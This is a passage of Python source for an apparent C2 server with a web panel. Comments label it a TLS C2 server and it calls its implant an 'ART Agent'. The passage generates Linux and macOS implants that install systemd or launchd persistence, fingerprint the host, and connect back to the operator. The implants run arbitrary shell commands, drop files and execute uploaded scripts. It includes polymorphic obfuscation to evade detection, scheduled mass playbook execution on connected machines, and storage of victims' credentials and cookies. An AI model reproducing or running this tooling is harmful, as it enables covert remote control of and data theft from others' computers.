            persistence_code = """
def gain_persistence():
    try:
        service_file = '''
[Unit]
Description=ART Agent Service
After=network.target

[Service]
ExecStart={sys.executable} {os.path.abspath(__file__)}
Restart=always

[Install]
WantedBy=multi-user.target
'''
        with open('/etc/systemd/system/art-agent.service', 'w') as f:
            f.write(service_file)
        subprocess.run('systemctl enable art-agent.service', shell=True)
        subprocess.run('systemctl start art-agent.service', shell=True)
    except Exception:
        pass
"""
    elif os_type == "macos":
        imports = "import socket, subprocess, os, platform, time, json, uuid, sys, base64, tempfile"
        client_filename = "client_macos.py"
        persistence_code = ""
        if persistence == "launchd":
            persistence_code = """
def gain_persistence():
    try:
        plist = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.art.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>'''
        with open(os.path.expanduser('~/Library/LaunchAgents/com.art.agent.plist'), 'w') as f:
            f.write(plist)
        subprocess.run(['launchctl', 'load', os.path.expanduser('~/Library/LaunchAgents/com.art.agent.plist')])
    except Exception:
        pass
"""
    else:
        await flash("Invalid OS type selected!", "danger")
        return redirect(url_for("config_page"))

    client_code = f"""#!/usr/bin/env python3
{imports}
from datetime import datetime

def get_public_ip():
    try:
        return subprocess.check_output("curl -s ifconfig.me", shell=True, text=True).strip()
    except Exception:
        return "Unknown"

def get_system_info():
    try:
        def check_admin():
            if platform.system().lower() == "windows":
                try:
                    import ctypes
                    return ctypes.windll.shell32.IsUserAnAdmin() == 1
                except:
                    return False
            elif platform.system().lower() in ["linux", "darwin"]:
                return os.geteuid() == 0
            else:
                return False
        def GUSN():
            try:
                return os.getlogin()
            except OSError:
                try:
                    import pwd
                    return pwd.getpwuid(os.getuid()).pw_name
                except:
                    return "unknown"
        return {{
            "HSTN": socket.gethostname(),
            "USNM": GUSN(),
            "os": f"{{platform.system()}} {{platform.release()}}",
            "LPI": socket.gethostbyname(socket.gethostname()),
            "PPI": get_public_ip(),
            "MDRS": ':'.join(['{{:02x}}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 8 * 6, 8)][::-1]),
            "IDM": check_admin(),
            "vs": "1.0.0"
        }}
    except Exception as e:
        return {{"error": f"Failed to collect system info: {{e}}"}}

def run_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return output
    except subprocess.CalledProcessError as e:
        return f"Error ejecutando el comando: {{e.output}}"

def upload_file(path, encoded_content):
    try:
        with open(path, 'wb') as f:
            f.write(base64.b64decode(encoded_content))
        return f"File uploaded to {{path}}"
    except Exception as e:
        return f"Error uploading file: {{e}}"

def download_file_to_client(path, encoded_content):
    try:
        # Ensure the directory exists
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'wb') as f:
            f.write(base64.b64decode(encoded_content))
        return f"File downloaded to {path}"
    except Exception as e:
        return f"Error downloading file to client: {e}"

def exec_script(filename, encoded_content, args):
    try:
        # Use a platform-appropriate temporary directory
        import tempfile
        temp_dir = tempfile.gettempdir()
        script_path = os.path.join(temp_dir, filename)
        with open(script_path, 'w', encoding='utf-8') as f:
            f.write(base64.b64decode(encoded_content).decode())
        # Set executable permissions on Unix-like systems
        if platform.system().lower() != "windows":
            os.chmod(script_path, 0o755)
        # Determine the command prefix based on the script type
        if filename.endswith('.py'):
            cmd_prefix = "python" if platform.system().lower() == "windows" else "python3"
        elif filename.endswith('.ps1'):
            cmd_prefix = "powershell -File" if platform.system().lower() == "windows" else None
        elif filename.endswith('.sh'):
            cmd_prefix = "bash" if platform.system().lower() != "windows" else None
        else:
            raise Exception("Unsupported script type")
        if not cmd_prefix:
            raise Exception(f"Script type not supported on {platform.system()}")
        # Construct the command with proper path separators
        script_path = script_path.replace("\\\\", "/") if platform.system().lower() == "windows" else script_path
        cmd = f"{cmd_prefix} {script_path} {args}" if args else f"{cmd_prefix} {script_path}"
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        os.remove(script_path)
        return output
    except subprocess.CalledProcessError as e:
        return f"Error ejecutando script: {e.output}"
    except Exception as e:
        return f"Error: {e}"

{persistence_code}

def connect_to_server():
    SERVER_IP = "{server_ip}"
    SERVER_PORT = {server_port}
    BUFFER_SIZE = {buffer_size}
    while True:
        try:
            with socket.create_connection((SERVER_IP, SERVER_PORT)) as s:
                s.sendall(json.dumps(get_system_info()).encode())
                while True:
                    command = s.recv(BUFFER_SIZE).decode().strip()
                    if not command or command.lower() == "exit" or command == "trmite":
                        break
                    if command == "BaNdErOlA":
                        continue
                    if command.startswith("upload "):
                        _, path, encoded_content = command.split(" ", 2)
                        response = upload_file(path, encoded_content)
                    if command.startswith("download "):
                        _, path, encoded_content = command.split(" ", 2)
                        response = download_file_to_client(path, encoded_content)
                    elif command.startswith("exec_script "):
                        parts = command.split(" ", 3)
                        filename = parts[1]
                        encoded_content = parts[2]
                        args = parts[3] if len(parts) > 3 else ""
                        response = exec_script(filename, encoded_content, args)
                    else:
                        response = run_command(command)
                    length_bytes = str(len(response.encode())).encode() + b'\\n'
                    s.sendall(length_bytes)
                    s.sendall(response.encode())
        except Exception as e:
            time.sleep(15)

if __name__ == "__main__":
    gain_persistence()
    connect_to_server()
"""

    # Apply obfuscation
    if obfuscation == "basic":
        client_code = basic_obfuscate_python(client_code)
    elif obfuscation == "advanced":
        client_code = advanced_obfuscate_python(client_code)
    elif obfuscation == "polymorphic":
        client_code = polymorphic_obfuscate(client_code)

    # Modify based on payload format and communication protocol
    client_code = generate_payload_code(client_code, payload_format, comm_protocol)

    try:
        temp_dir = os.path.join(os.getcwd(), "generated_clients")
        os.makedirs(temp_dir, exist_ok=True)
        client_file_path = os.path.join(temp_dir, client_filename)
        
        with open(client_file_path, "w") as client_file:
            client_file.write(client_code)
        asyncio.create_task(delete_directory_after_delay(temp_dir, 30))
        return await send_file(client_file_path, as_attachment=True, attachment_filename=client_filename)
    except Exception as e:
        await flash(f"Error generating client: {e}", "danger")
        return redirect(url_for("config_page"))
    
async def delete_directory_after_delay(directory_path, delay):
    await asyncio.sleep(delay)
    if os.path.exists(directory_path):
        shutil.rmtree(directory_path)

# ---------------------------
# RUTAS DE PLAYBOOKS
# ---------------------------
async def get_playbook(playbook_id: int) -> dict:
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute(
            """
            SELECT id, name, description, commands, schedule, conditions, mitre_mappings, created_at, updated_at, author, status
            FROM playbooks WHERE id = ?
            """,
            (playbook_id,)
        ) as cursor:
            row = await cursor.fetchone()
            if row:
                return {
                    "id": row[0],
                    "name": row[1],
                    "description": row[2],
                    "commands": json.loads(row[3]),
                    "schedule": json.loads(row[4]),
                    "conditions": json.loads(row[5]),
                    "mitre_mappings": json.loads(row[6]),
                    "created_at": row[7],
                    "updated_at": row[8],
                    "author": row[9],
                    "status": row[10]
                }
    return None

@app.route("/playbooks", methods=["GET"])
@license_required
@login_required
async def get_all_playbooks():
    playbooks = []
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute(
            """
            SELECT id, name, description, commands, schedule, conditions, mitre_mappings, created_at, updated_at, author, status
            FROM playbooks ORDER BY updated_at DESC
            """
        ) as cursor:
            async for row in cursor:
                playbooks.append({
                    "id": row[0],
                    "name": row[1],
                    "description": row[2],
                    "commands": json.loads(row[3]),
                    "schedule": json.loads(row[4]),
                    "conditions": json.loads(row[5]),
                    "mitre_mappings": json.loads(row[6]),
                    "created_at": row[7],
                    "updated_at": row[8],
                    "author": row[9],
                    "status": row[10]
                })
    return jsonify(playbooks)

@app.route("/playbook/create", methods=["POST"])
@license_required
@login_required
async def create_playbook():
    data = await request.get_json()
    name = data.get("name")
    description = data.get("description", "")
    commands = data.get("commands", [])
    schedule = data.get("schedule", {})
    conditions = data.get("conditions", {})
    mitre_mappings = data.get("mitre_mappings", [])
    status = data.get("status", "Draft")
    author = session.get("username", "Unknown")
    
    if not name or not commands:
        return jsonify({"error": "Name and commands are required"}), 400
    
    now = time.strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_FILE) as db:
        try:
            await db.execute(
                """
                INSERT INTO playbooks (name, description, commands, schedule, conditions, mitre_mappings, created_at, updated_at, author, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    name,
                    description,
                    json.dumps(commands),
                    json.dumps(schedule),
                    json.dumps(conditions),
                    json.dumps(mitre_mappings),
                    now,
                    now,
                    author,
                    status
                )
            )
            await db.commit()
            return jsonify({"success": True, "message": f"Playbook '{name}' created successfully"})
        except aiosqlite.IntegrityError:
            return jsonify({"error": f"Playbook name '{name}' already exists"}), 400

@app.route("/playbook/<int:playbook_id>/update", methods=["POST"])
@license_required
@login_required
async def update_playbook(playbook_id):
    data = await request.get_json()
    name = data.get("name")
    description = data.get("description", "")
    commands = data.get("commands", [])
    schedule = data.get("schedule", {})
    conditions = data.get("conditions", {})
    mitre_mappings = data.get("mitre_mappings", [])
    status = data.get("status", "Draft")
    author = session.get("username", "Unknown")
    
    if not name or not commands:
        return jsonify({"error": "Name and commands are required"}), 400
    
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT id FROM playbooks WHERE id = ?", (playbook_id,)) as cursor:
            if not await cursor.fetchone():
                return jsonify({"error": "Playbook not found"}), 404
        
        try:
            await db.execute(
                """
                UPDATE playbooks SET
                    name = ?, description = ?, commands = ?, schedule = ?, conditions = ?,
                    mitre_mappings = ?, updated_at = ?, author = ?, status = ?
                WHERE id = ?
                """,
                (
                    name,
                    description,
                    json.dumps(commands),
                    json.dumps(schedule),
                    json.dumps(conditions),
                    json.dumps(mitre_mappings),
                    time.strftime('%Y-%m-%d %H:%M:%S'),
                    author,
                    status,
                    playbook_id
                )
            )
            await db.commit()
            return jsonify({"success": True, "message": f"Playbook '{name}' updated successfully"})
        except aiosqlite.IntegrityError:
            return jsonify({"error": f"Playbook name '{name}' already exists"}), 400

@app.route("/playbook/<int:playbook_id>/delete", methods=["POST"])
@license_required
@login_required
async def delete_playbook(playbook_id):
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT id FROM playbooks WHERE id = ?", (playbook_id,)) as cursor:
            if not await cursor.fetchone():
                return jsonify({"error": "Playbook not found"}), 404
        
        await db.execute("DELETE FROM playbooks WHERE id = ?", (playbook_id,))
        await db.execute("DELETE FROM playbook_executions WHERE playbook_id = ?", (playbook_id,))
        await db.commit()
    return jsonify({"success": True, "message": "Playbook deleted successfully"})

@app.route("/client/<int:client_id>/execute_playbook", methods=["POST"])
@license_required
@login_required
async def execute_playbook(client_id):
    try:
        if client_id not in CLIENTS:
            return jsonify({"error": "Client not found"}), 404
        
        sess = CLIENTS[client_id]
        if not sess.online:
            return jsonify({"error": "Client is offline"}), 400
        
        data = await request.get_json()
        if not data or "playbook_id" not in data:
            return jsonify({"error": "Missing playbook_id in request"}), 400
        
        playbook_id = data.get("playbook_id")
        triggered_by = data.get("triggered_by", "Manual")
        
        playbook = await get_playbook(playbook_id)
        if not playbook:
            return jsonify({"error": "Playbook not found"}), 404
        
        # Log playbook execution attempt
        colored_print(f"[+] Attempting to execute playbook '{playbook['name']}' on client {client_id}", "info")
        
        execution_id = None
        async with aiosqlite.connect(DB_FILE) as db:
            try:
                await db.execute(
                    """
                    INSERT INTO playbook_executions (playbook_id, client_id, status, started_at, triggered_by)
                    VALUES (?, ?, ?, ?, ?)
                    """,
                    (playbook_id, client_id, "Running", time.strftime('%Y-%m-%d %H:%M:%S'), triggered_by)
                )
                await db.commit()
                async with db.execute("SELECT last_insert_rowid()") as cursor:
                    execution_id = (await cursor.fetchone())[0]
            except Exception as e:
                colored_print(f"[!] Database error during execution insertion: {e}", "error")
                return jsonify({"error": f"Database error: {str(e)}"}), 500
        
        results = []
        os_type = sess.info.get("os", "").lower()
        os_key = "Windows" if "windows" in os_type else "Linux" if "linux" in os_type else "macOS" if "macos" in os_type else None
        
        for cmd in playbook["commands"]:
            try:
                # Check conditions
                if cmd.get("condition", {}):
                    if not await evaluate_condition(cmd["condition"], sess):
                        results.append({
                            "command": cmd["value"],
                            "result": f"[SKIPPED] Condition not met: {json.dumps(cmd['condition'])}",
                            "error": False,
                            "skipped": True
                        })
                        continue
                
                command_text = None
                if cmd["type"] == "predefined":
                    if cmd["value"] not in PREDEFINED_COMMANDS or not os_key or os_key not in PREDEFINED_COMMANDS[cmd["value"]]:
                        results.append({
                            "command": cmd["value"],
                            "result": f"[ERROR] Command '{cmd['value']}' not supported for OS: {os_type}",
                            "error": True
                        })
                        continue
                    command_text = PREDEFINED_COMMANDS[cmd["value"]][os_key]
                    # Apply parameters
                    for param, value in cmd.get("parameters", {}).items():
                        command_text = command_text.replace(f"{{{param}}}", value)
                else:
                    command_text = cmd["value"]
                
                # Log command execution
                colored_print(f"[+] Executing command '{cmd['value']}' on client {client_id}", "info")
                
                try:
                    response = await _send_command_and_read(sess, command_text, "playbook")
                    results.append({
                        "command": cmd["value"],
                        "result": response,
                        "error": False,
                        "parameters": cmd.get("parameters", {})
                    })
                except Exception as e:
                    results.append({
                        "command": cmd["value"],
                        "result": f"[ERROR] {str(e)}",
                        "error": True,
                        "parameters": cmd.get("parameters", {})
                    })
            except Exception as e:
                colored_print(f"[!] Error processing command '{cmd.get('value', 'unknown')}' for client {client_id}: {e}", "error")
                results.append({
                    "command": cmd.get("value", "unknown"),
                    "result": f"[ERROR] Processing error: {str(e)}",
                    "error": True,
                    "parameters": cmd.get("parameters", {})
                })
        
        status = "Completed" if all(not r.get("error") and not r.get("skipped") for r in results) else "Failed"
        async with aiosqlite.connect(DB_FILE) as db:
            try:
                await db.execute(
                    """
                    UPDATE playbook_executions
                    SET status = ?, results = ?, completed_at = ?
                    WHERE id = ?
                    """,
                    (status, json.dumps(results), time.strftime('%Y-%m-%d %H:%M:%S'), execution_id)
                )
                await db.commit()
            except Exception as e:
                colored_print(f"[!] Database error during execution update: {e}", "error")
                return jsonify({"error": f"Database error: {str(e)}"}), 500
        
        try:
            await insert_log(
                "client",
                sess.info.get("MDRS", "unknown"),
                f"Execute Playbook: {playbook['name']}",
                json.dumps(results)
            )
        except Exception as e:
            colored_print(f"[!] Error logging playbook execution: {e}", "error")
        
        # Generate report
        report_path = ""
        try:
            report_path = await generate_playbook_report(execution_id, playbook, results, sess)
        except Exception as e:
            colored_print(f"[!] Error generating report: {e}", "error")
        
        # Log successful execution
        colored_print(f"[+] Playbook '{playbook['name']}' executed on client {client_id} with status {status}", "success")
        
        # Test JSON serialization
        try:
            json.dumps(results)
            json.dumps(playbook)
        except Exception as e:
            colored_print(f"[!] JSON serialization error: {e}", "error")
            return jsonify({"error": f"JSON serialization error: {str(e)}"}), 500
        
        return jsonify({
            "success": True,
            "playbook_name": playbook["name"],
            "execution_id": execution_id,
            "results": results,
            "report_path": report_path
        })
    except Exception as e:
        colored_print(f"[!] Unexpected error in execute_playbook for client {client_id}: {e}", "error")
        return jsonify({"error": f"Unexpected server error: {str(e)}"}), 500
        
async def evaluate_condition(condition: dict, sess: 'ClientSession') -> bool:
    """
    Evaluates a condition for command execution.
    Example condition: {"os": "Windows", "admin": true}
    """
    try:
        os_type = sess.info.get("os", "").lower()
        if condition.get("os"):
            required_os = condition["os"].lower()
            if required_os not in os_type:
                return False
        
        if condition.get("admin") is not None:
            is_admin = sess.info.get("IDM", False)
            if condition["admin"] != is_admin:
                return False
        
        return True
    except Exception as e:
        colored_print(f"[!] Error evaluating condition: {e}", "error")
        return False

async def generate_playbook_report(execution_id: int, playbook: dict, results: list, sess: ClientSession) -> str:
    """
    Generates a PDF report for playbook execution.
    """
    try:
        report_dir = os.path.join(os.getcwd(), "reports")
        os.makedirs(report_dir, exist_ok=True)
        report_path = os.path.join(report_dir, f"playbook_execution_{execution_id}.pdf")
        
        doc = SimpleDocTemplate(report_path, pagesize=letter)
        styles = getSampleStyleSheet()
        story = []
        
        story.append(Paragraph(f"Playbook Execution Report: {playbook['name']}", styles['Title']))
        story.append(Spacer(1, 12))
        story.append(Paragraph(f"Execution ID: {execution_id}", styles['Normal']))
        story.append(Paragraph(f"Client: {sess.info.get('HSTN', 'Unknown')}", styles['Normal']))
        story.append(Paragraph(f"Started: {time.strftime('%Y-%m-%d %H:%M:%S')}", styles['Normal']))
        story.append(Spacer(1, 12))
        
        story.append(Paragraph("Description:", styles['Heading2']))
        story.append(Paragraph(playbook['description'] or "No description", styles['Normal']))
        story.append(Spacer(1, 12))
        
        story.append(Paragraph("MITRE ATT&CK Mappings:", styles['Heading2']))
        story.append(Paragraph(", ".join(playbook['mitre_mappings']) or "None", styles['Normal']))
        story.append(Spacer(1, 12))
        
        story.append(Paragraph("Execution Results:", styles['Heading2']))
        data = [["Command", "Result", "Status"]]
        for result in results:
            status = "ERROR" if result.get("error") else "SKIPPED" if result.get("skipped") else "SUCCESS"
            data.append([
                result["command"],
                result["result"][:100] + ("..." if len(result["result"]) > 100 else ""),
                status
            ])
        
        table = Table(data)
        table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
            ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, 0), 12),
            ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
            ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
            ('GRID', (0, 0), (-1, -1), 1, colors.black)
        ]))
        story.append(table)
        
        doc.build(story)
        return report_path
    except Exception as e:
        colored_print(f"[!] Error generating report: {e}", "error")
        return ""

@app.route("/playbook_execution/<int:execution_id>/report", methods=["GET"])
@license_required
@login_required
async def download_playbook_report(execution_id):
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT playbook_id FROM playbook_executions WHERE id = ?", (execution_id,)) as cursor:
            row = await cursor.fetchone()
            if not row:
                return jsonify({"error": "Execution not found"}), 404
    
    report_path = os.path.join(os.getcwd(), "reports", f"playbook_execution_{execution_id}.pdf")
    if not os.path.exists(report_path):
        return jsonify({"error": "Report not found"}), 404
    
    return await send_file(report_path, as_attachment=True, attachment_filename=f"playbook_execution_{execution_id}.pdf")

async def run_scheduled_playbooks():
    """
    Background task to execute scheduled playbooks.
    """
    while True:
        try:
            async with aiosqlite.connect(DB_FILE) as db:
                async with db.execute("SELECT id, schedule FROM playbooks WHERE status = 'Active' AND schedule != '{}'" ) as cursor:
                    playbooks = await cursor.fetchall()
            
            now = datetime.datetime.now()
            for playbook_id, schedule_json in playbooks:
                try:
                    schedule = json.loads(schedule_json)
                    if not schedule.get("cron"):
                        continue
                    cron = croniter.croniter(schedule["cron"], now)
                    next_run = cron.get_next(datetime.datetime)
                    if (next_run - now).total_seconds() < 60:  # Within next minute
                        # Find eligible clients
                        async with aiosqlite.connect(DB_FILE) as db:
                            async with db.execute("SELECT client_id FROM clients WHERE online = 1") as cursor:
                                client_ids = [row[0] for row in await cursor.fetchall()]
                        
                        for client_id in client_ids:
                            if client_id not in CLIENTS or not CLIENTS[client_id].online:
                                colored_print(f"[!] Skipping client {client_id}: not online", "warning")
                                continue
                            
                            # Execute playbook
                            execution_id = None
                            async with aiosqlite.connect(DB_FILE) as db:
                                await db.execute(
                                    """
                                    INSERT INTO playbook_executions (playbook_id, client_id, status, started_at, triggered_by)
                                    VALUES (?, ?, ?, ?, ?)
                                    """,
                                    (playbook_id, client_id, "Running", time.strftime('%Y-%m-%d %H:%M:%S'), "Schedule")
                                )
                                await db.commit()
                                async with db.execute("SELECT last_insert_rowid()") as cursor:
                                    execution_id = (await cursor.fetchone())[0]
                            
                            playbook = await get_playbook(playbook_id)
                            if not playbook:
                                colored_print(f"[!] Playbook {playbook_id} not found", "error")
                                continue
                            
                            sess = CLIENTS[client_id]
                            results = []
                            os_type = sess.info.get("os", "").lower()
                            os_key = "Windows" if "windows" in os_type else "Linux" if "linux" in os_type else "macOS" if "macos" in os_type else None
                            
                            for cmd in playbook["commands"]:
                                try:
                                    if cmd.get("condition", {}):
                                        if not await evaluate_condition(cmd["condition"], sess):
                                            results.append({
                                                "command": cmd["value"],
                                                "result": f"[SKIPPED] Condition not met: {json.dumps(cmd['condition'])}",
                                                "error": False,
                                                "skipped": True
                                            })
                                            continue
                                    
                                    command_text = None
                                    if cmd["type"] == "predefined":
                                        if cmd["value"] not in PREDEFINED_COMMANDS or not os_key or os_key not in PREDEFINED_COMMANDS[cmd["value"]]:
                                            results.append({
                                                "command": cmd["value"],
                                                "result": f"[ERROR] Command '{cmd['value']}' not supported for OS: {os_type}",
                                                "error": True
                                            })
                                            continue
                                        command_text = PREDEFINED_COMMANDS[cmd["value"]][os_key]
                                        for param, value in cmd.get("parameters", {}).items():
                                            command_text = command_text.replace(f"{{{param}}}", value)
                                    else:
                                        command_text = cmd["value"]
                                    
                                    try:
                                        response = await _send_command_and_read(sess, command_text, "playbook")
                                        results.append({
                                            "command": cmd["value"],
                                            "result": response,
                                            "error": False,
                                            "parameters": cmd.get("parameters", {})
                                        })
                                    except Exception as e:
                                        results.append({
                                            "command": cmd["value"],
                                            "result": f"[ERROR] {str(e)}",
                                            "error": True,
                                            "parameters": cmd.get("parameters", {})
                                        })
                                except Exception as e:
                                    colored_print(f"[!] Error processing command '{cmd.get('value', 'unknown')}' for client {client_id}: {e}", "error")
                                    results.append({
                                        "command": cmd.get("value", "unknown"),
                                        "result": f"[ERROR] Processing error: {str(e)}",
                                        "error": True,
                                        "parameters": cmd.get("parameters", {})
                                    })
                            
                            status = "Completed" if all(not r.get("error") and not r.get("skipped") for r in results) else "Failed"
                            async with aiosqlite.connect(DB_FILE) as db:
                                try:
                                    await db.execute(
                                        """
                                        UPDATE playbook_executions
                                        SET status = ?, results = ?, completed_at = ?
                                        WHERE id = ?
                                        """,
                                        (status, json.dumps(results), time.strftime('%Y-%m-%d %H:%M:%S'), execution_id)
                                    )
                                    await db.commit()
                                except Exception as e:
                                    colored_print(f"[!] Database error updating execution {execution_id}: {e}", "error")
                            
                            try:
                                await insert_log(
                                    "client",
                                    sess.info.get("MDRS", "unknown"),
                                    f"Scheduled Playbook: {playbook['name']}",
                                    json.dumps(results)
                                )
                            except Exception as e:
                                colored_print(f"[!] Error logging scheduled playbook execution: {e}", "error")
                            
                            try:
                                await generate_playbook_report(execution_id, playbook, results, sess)
                            except Exception as e:
                                colored_print(f"[!] Error generating report for execution {execution_id}: {e}", "error")
                            
                            colored_print(f"[+] Scheduled playbook '{playbook['name']}' executed on client {client_id} with status {status}", "success")
                except Exception as e:
                    colored_print(f"[!] Error processing playbook {playbook_id}: {e}", "error")
        except Exception as e:
            colored_print(f"[!] Error in scheduled playbook execution: {e}", "error")
        await asyncio.sleep(60)  # Check every minute

@app.route("/playbook_executions", methods=["GET"])
@license_required
@login_required
async def get_playbook_executions():
    executions = []
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute(
            """
            SELECT id, playbook_id, client_id, status, results, started_at, completed_at, triggered_by
            FROM playbook_executions ORDER BY started_at DESC
            """
        ) as cursor:
            async for row in cursor:
                executions.append({
                    "id": row[0],
                    "playbook_id": row[1],
                    "client_id": row[2],
                    "status": row[3],
                    "results": json.loads(row[4]) if row[4] else [],
                    "started_at": row[5],
                    "completed_at": row[6],
                    "triggered_by": row[7]
                })
    return jsonify(executions)

# ---------------------------
# RUTAS PARA LA FICHA DE CLIENTES
# ---------------------------
@app.route("/clients_db")
@license_required
@login_required
async def clients_db():
    clients = await get_clients()
    return await render_template("clients_db.html", clients=clients)

@app.route("/client_info", methods=["GET"])
@license_required
@login_required
async def client_info():
    client_id = request.args.get("clientId", type=int)
    if not client_id:
        await flash("No client ID provided.", "danger")
        return redirect(url_for("index"))
    
    clients = await get_clients()
    client = next((c for c in clients if c["id"] == client_id), None)
    if not client:
        await flash("Client not found.", "danger")
        return redirect(url_for("index"))
    
    return await render_template("client_info.html", client=client)

@app.route("/update_client_fields", methods=["POST"])
@license_required
@login_required
async def update_client_fields_route():
    data = await request.get_json()
    client_id = int(data.get("client_id", -1))
    credentials = data.get("credentials", "")
    notes = data.get("notes", "")
    tags = data.get("tags", "")
    custom_name = data.get("custom_name", "")
    cookie = data.get("cookie", "")
    try:
        await update_client_fields(client_id, credentials, notes, tags, custom_name, cookie)
        return jsonify({"success": "Client fields updated."})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/client/<int:client_id>/delete", methods=["POST"])
@license_required
@login_required
async def delete_client(client_id):
    try:
        async with aiosqlite.connect(DB_FILE) as db:
            await db.execute("DELETE FROM clients WHERE client_id = ?", (client_id,))
            await db.commit()
        if client_id in CLIENTS:
            sess = CLIENTS[client_id]
            sess.online = False
            try:
                async with sess.write_lock:
                    sess.writer.write(b"trmite\n")
                    await sess.writer.drain()
                sess.writer.close()
                await sess.writer.wait_closed()
            except:
                pass
            del CLIENTS[client_id]
        asyncio.create_task(broadcast_clients_update())
        return jsonify({"success": "Client deleted successfully."})
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    
@app.route("/delete_script/<script_name>", methods=["DELETE"])
@license_required
async def delete_script(script_name):
    script_name = secure_filename(script_name)
    filepath = os.path.join(os.getcwd(), "modules", script_name)
    if not os.path.exists(filepath):
        return jsonify({"error": "Script not found"}), 404
    try:
        os.remove(filepath)
        return jsonify({"success": True, "message": f"Script '{script_name}' deleted successfully."})
    except Exception as e:
        return jsonify({"error": f"Failed to delete script: {str(e)}"}), 500
    
@app.route("/list_scripts", methods=["GET"])
@license_required
async def list_scripts():
    modules_dir = os.path.join(os.getcwd(), "modules")
    if not os.path.exists(modules_dir):
        os.makedirs(modules_dir)
        return jsonify({"scripts": []})
    
    scripts = []
    for filename in os.listdir(modules_dir):
        filepath = os.path.join(modules_dir, filename)
        if os.path.isfile(filepath):
            stats = os.stat(filepath)
            script_type = os.path.splitext(filename)[1].lower()
            scripts.append({
                "name": filename,
                "base_name": filename.rsplit('.', 1)[0],
                "type": script_type if script_type else "unknown",
                "size": stats.st_size,
                "last_modified": datetime.datetime.fromtimestamp(stats.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
            })
    return jsonify({"scripts": scripts})

@app.route("/save_script", methods=["POST"])
@license_required
async def save_script():
    data = await request.get_json()
    script_name = data.get('name')
    script_content = data.get('content')
    script_type = data.get('type')

    if not script_name or not script_content or not script_type:
        return jsonify({"error": "Missing required fields (name, content, type)"}), 400

    # Ensure the script name ends with the correct extension
    if not script_name.lower().endswith(script_type.lower()):
        script_name = f"{script_name}{script_type}"

    # Sanitize the script name
    script_name = secure_filename(script_name)
    modules_dir = os.path.join(os.getcwd(), "modules")
    if not os.path.exists(modules_dir):
        os.makedirs(modules_dir)

    filepath = os.path.join(modules_dir, script_name)

    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(script_content)
        return jsonify({"success": True, "message": f"Script '{script_name}' saved successfully."})
    except Exception as e:
        return jsonify({"error": f"Failed to save script: {str(e)}"}), 500
        
@app.route("/load_script/<script_name>", methods=["GET"])
@license_required
async def load_script(script_name):
    script_name = secure_filename(script_name)
    filepath = os.path.join(os.getcwd(), "modules", script_name)
    if not os.path.exists(filepath):
        return jsonify({"error": "Script not found"}), 404
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            script_content = f.read()
        return jsonify({"content": script_content})
    except Exception as e:
        return jsonify({"error": f"Failed to load script: {str(e)}"}), 500

# ---------------------------
# FUNCIONALIDADES DEL SERVIDOR TLS (C2)
# ---------------------------
CLIENTS: Dict[int, Any] = {}
NEXT_CLIENT_ID = 0

def colored_print(message, log_type="info"):
    if log_type == "success":
        print(f"{Fore.GREEN}{message}{Style.RESET_ALL}")
    elif log_type == "connected":
        print(f"{Fore.LIGHTGREEN_EX}{message}{Style.RESET_ALL}")
    elif log_type == "warning":
        print(f"{Fore.YELLOW}{message}{Style.RESET_ALL}")
    elif log_type == "error":
        print(f"{Fore.RED}{message}{Style.RESET_ALL}")
    elif log_type == "block":
        print(f"{Fore.LIGHTMAGENTA_EX}{message}{Style.RESET_ALL}")
    elif log_type == "file":
        print(f"{Fore.LIGHTBLUE_EX}{message}{Style.RESET_ALL}")
    else:
        print(f"{Fore.LIGHTWHITE_EX}{message}{Style.RESET_ALL}")

def polymorphic_obfuscate(code: str) -> str:
    """
    Applies polymorphic obfuscation by dynamically altering the code structure.
    This is a simplified version; in practice, this would involve more complex transformations.
    """
    try:
        # Parse the code to AST
        tree = ast.parse(code)
        # Rename variables and functions with random names
        used_names = set(keyword.kwlist)
        def generate_random_name():
            while True:
                name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
                if name not in used_names:
                    used_names.add(name)
                    return name

        class PolymorphicObfuscator(ast.NodeTransformer):
            def __init__(self):
                self.name_map = {}

            def visit_Name(self, node):
                if node.id not in self.name_map and node.id not in keyword.kwlist:
                    self.name_map[node.id] = generate_random_name()
                if isinstance(node.ctx, (ast.Store, ast.Load)):
                    node.id = self.name_map.get(node.id, node.id)
                return node

            def visit_FunctionDef(self, node):
                if node.name not in self.name_map:
                    self.name_map[node.name] = generate_random_name()
                node.name = self.name_map[node.name]
                return self.generic_visit(node)

        obfuscated_tree = PolymorphicObfuscator().visit(tree)
        obfuscated_code = ast.unparse(obfuscated_tree)

        # Add junk code with random transformations
        junk_lines = [
            f"{generate_random_name()} = {random.randint(1, 1000)}",
            f"if False: {generate_random_name()} = None",
